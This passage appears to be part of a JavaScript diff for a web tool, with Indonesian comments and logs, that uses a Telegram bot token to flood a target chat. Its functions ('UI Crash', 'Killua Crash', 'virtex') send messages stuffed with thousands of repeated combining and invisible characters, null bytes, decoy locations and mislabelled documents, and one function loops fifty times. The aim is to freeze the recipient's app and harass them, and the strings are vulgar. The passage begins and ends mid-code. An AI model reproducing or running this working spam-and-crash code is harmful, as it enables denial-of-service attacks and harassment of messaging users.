ᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼ".repeat(2000);
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        latitude: lat,
+        longitude: lon
+      })
+    });
+
+    const data = await res.json();
+
+    if (data.ok) {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: target,
+          text: title + "\n\n" + "Killua Crash" + "҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝AYAM BETUTU".repeat(2000)
+        })
+      });
+      document.getElementById("consoleOutput").textContent += `📍 Lokasi crash UI terkirim ke ${target}\n`;
+    } else {
+      document.getElementById("consoleOutput").textContent += `❌ Gagal kirim lokasi: ${data.description}\n`;
+    }
+  } catch (err) {
+    document.getElementById("consoleOutput").textContent += `⚠ Error kirim lokasi: ${err.message}\n`;
+  }
+}
+
+/* Adaptasi LocaPayloadFc untuk Telegram Web */
+async function sendLocaPayloadFc(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    return;
+  }
+
+  const steps = [
+    {
+      type: "message",
+      text: "</> Suika Not Dev\n\n" + "{".repeat(2000)
+    },
+    {
+      type: "message",
+      text: "@pnx_loophole\n" + "{".repeat(1000)
+    },
+    {
+      type: "message",
+      text: "Changli Crashers\n" + "{".repeat(2000)
+    },
+    {
+      type: "location",
+      lat: 0,
+      lon: 0
+    },
+    {
+      type: "photo",
+      url: "https://via.placeholder.com/1", // gambar kosong
+      caption: "FINIX - CRITICAL FINISH\nAi To Crash " + "\u0000".repeat(50)
+    }
+  ];
+
+  for (let i = 0; i < steps.length; i++) {
+    try {
+      let res;
+      if (steps[i].type === "message") {
+        res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: target,
+            text: steps[i].text
+          })
+        });
+      } else if (steps[i].type === "location") {
+        res = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: target,
+            latitude: steps[i].lat,
+            longitude: steps[i].lon
+          })
+        });
+      } else if (steps[i].type === "photo") {
+        res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: target,
+            photo: steps[i].url,
+            caption: steps[i].caption
+          })
+        });
+      }
+
+      const data = await res.json();
+      if (data.ok) {
+        document.getElementById("consoleOutput").textContent += `✅ Step ${i + 1} terkirim.\n`;
+      } else {
+        document.getElementById("consoleOutput").textContent += `❌ Step ${i + 1} gagal: ${data.description}\n`;
+      }
+
+      await new Promise(res => setTimeout(res, 500));
+    } catch (err) {
+      document.getElementById("consoleOutput").textContent += `⚠ Step ${i + 1} error: ${err.message}\n`;
+    }
+  }
+}
+
+/* Adaptasi DocuSql untuk Telegram */
+async function sendDocuSql(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    return;
+  }
+
+  let Lonte = "༑⌁⃰COD KONDOM 1JUTAཀ‌‌🦠" + "ꦾ".repeat(500);
+  let virtex = "MAKLU W ENTOD" + "ြ".repeat(500);
+
+  const steps = [
+    {
+      type: "message",
+      text: "⎋𝐘𝐀̸̷̷̷̋͜͢͜͢͠͡͡𝐍𝐁𝐎𝐘͢-‣" + "ោ៝".repeat(500) + "\n" + virtex
+    },
+    {
+      type: "location",
+      lat: 0.0349,
+      lon: -0.0349,
+      name: Lonte
+    },
+    {
+      type: "document",
+      url: "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf",
+      filename: "BOKEP 1000 VIDIO.pptx",
+      caption: virtex
+    }
+  ];
+
+  for (let i = 0; i < steps.length; i++) {
+    try {
+      let res;
+      if (steps[i].type === "message") {
+        res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: target, text: steps[i].text })
+        });
+      } else if (steps[i].type === "location") {
+        res = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: target,
+            latitude: steps[i].lat,
+            longitude: steps[i].lon
+          })
+        });
+      } else if (steps[i].type === "document") {
+        res = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: target,
+            document: steps[i].url,
+            caption: steps[i].caption
+          })
+        });
+      }
+
+      const data = await res.json();
+      if (data.ok) {
+        document.getElementById("consoleOutput").textContent += `✅ Step ${i + 1} terkirim.\n`;
+      } else {
+        document.getElementById("consoleOutput").textContent += `❌ Step ${i + 1} gagal: ${data.description}\n`;
+      }
+
+      await new Promise(res => setTimeout(res, 500));
+    } catch (err) {
+      document.getElementById("consoleOutput").textContent += `⚠ Step ${i + 1} error: ${err.message}\n`;
+    }
+  }
+}
+
+/* Fungsi UI Crash versi Xrelly untuk Telegram */
+async function sendUiCrash(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    return;
+  }
+
+  try {
+    const lat = 11.11;
+    const lon = -11.11;
+    const title = " ./𝘅𝗿𝗹.𝛆𝛘𝛆¿? " + "꧀".repeat(2000);
+
+    // Kirim lokasi
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        latitude: lat,
+        longitude: lon
+      })
+    });
+
+    const data = await res.json();
+
+    // Kirim pesan tambahan seperti di versi WA
+    if (data.ok) {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: target,
+          text: ".".repeat(2000) + "\n\n‼️⃟ ./𝘅𝗿𝗹.𝛆𝛘𝛆𝂀"
+        })
+      });
+      document.getElementById("consoleOutput").textContent += `📍 UI Crash Ui terkirim ke ${target}\n`;
+    } else {
+      document.getElementById("consoleOutput").textContent += `❌ Gagal kirim UI Crash UI: ${data.description}\n`;
+    }
+  } catch (err) {
+    document.getElementById("consoleOutput").textContent += `⚠ Error kirim UI Crash CRASH UI: ${err.message}\n`;
+  }
+}
+r
+// Versi adaptasi XnXxUi untuk Telegram Website
+async function XnXxUi(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    return;
+  }
+
+  const MemekMelar = "ꦾ".repeat(1000); // Batasi agar tidak kena limit Telegram
+  const spamText =
+    "ꈍᴗꈍ\n\n" +
+    "\n".repeat(10) +
+    MemekMelar +
+    "\n\n" +
+    "🔘 Button: single_select\n" +
+    MemekMelar +
+    "\n🔘 Button: call_permission_request {status:true}\n" +
+    MemekMelar;
+
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        text: spamText
+      })
+    });
+
+    const data = await res.json();
+    if (data.ok) {
+      document.getElementById("consoleOutput").textContent += `✅ CRASH UI terkirim ke ${target}\n`;
+    } else {
+      document.getElementById("consoleOutput").textContent += `❌ Gagal kirim CRASH UI ${data.description}\n`;
+    }
+  } catch (err) {
+    document.getElementById("consoleOutput").textContent += `⚠ Error CRASH UI: ${err.message}\n`;
+  }
+}
+
+async function paradoxes(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    return;
+  }
+  if (!target) {
+    alert("Target tidak valid.");
+    return;
+  }
+
+  const log = msg => {
+    const el = document.getElementById("consoleOutput");
+    if (el) el.textContent += msg + "\n";
+  };
+  const sleep = ms => new Promise(res => setTimeout(res, ms));
+
+  for (let i = 0; i < 50; i++) {
+    try {
+      // Step 1 — Pesan awal
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: target,
+          text: "𝐄͢𝐭͡𝐞͜𝐫͡𝐧⍣᳟𝐚͡𝐥͡𝐆͢𝐚𝐥𝐚͜𝐱͡𝐲⍣᳟꙳⟅"
+        })
+      });
+      log(`Loop ${i + 1} - Step 1 terkirim`);
+
+      // Step 2 — Kirim dokumen tiruan
+      await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: target,
+          document: "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf",
+          caption: "༑𝐄͢𝐭͡𝐞͜𝐫͡𝐧⍣᳟𝐚͡𝐥͡𝐆͢𝐚𝐥𝐚͜𝐱͡𝐲⍣᳟꙳⟅\n" +
+                   "ꦽ".repeat(100) + "@13135550202".repeat(50)
+        })
+      });
+      log(`Loop ${i + 1} - Step 2 terkirim`);
+
+      // Step 3 — Kirim teks panjang (dengan potongan biar aman)
+      const bigText = "‼ TeamKilluaCrash𝂀 ¿? " + "𑇂𑆵𑆴𑆿".repeat(3000);
+      const chunkSize = 3500; // Telegram limit aman
+      for (let start = 0; start < bigText.length; start += chunkSize) {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: target,
+            text: bigText.slice(start, start + chunkSize)
+          })
+        });
+        await sleep(150);
+      }
+      log(`Loop ${i + 1} - Step 3 terkirim`);
+
+      // Step 4 — Kirim spam unicode
+      const spamText = "҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝AYAM BETUTU".repeat(1000) + "@1".repeat(1000);
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: target, text: spamText })
+      });
+      log(`Loop ${i + 1} - Step 4 terkirim`);
+
+    } catch (err) {
+      log(`⚠ Loop ${i + 1} error: ${err.message}`);
+    }
+
+    await sleep(300); // delay antar loop
+  }
+
+  log("✅ Semua loop selesai");
+}
+
+// Adaptasi FcFastByUi untuk Telegram Website
+async function FcFastByUi(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    return;
+  }
+
+  // Batasi panjang teks agar aman di Telegram
+  const headerText = "</> Killua Crash\n\n" + "ꦽ".repeat(1000);
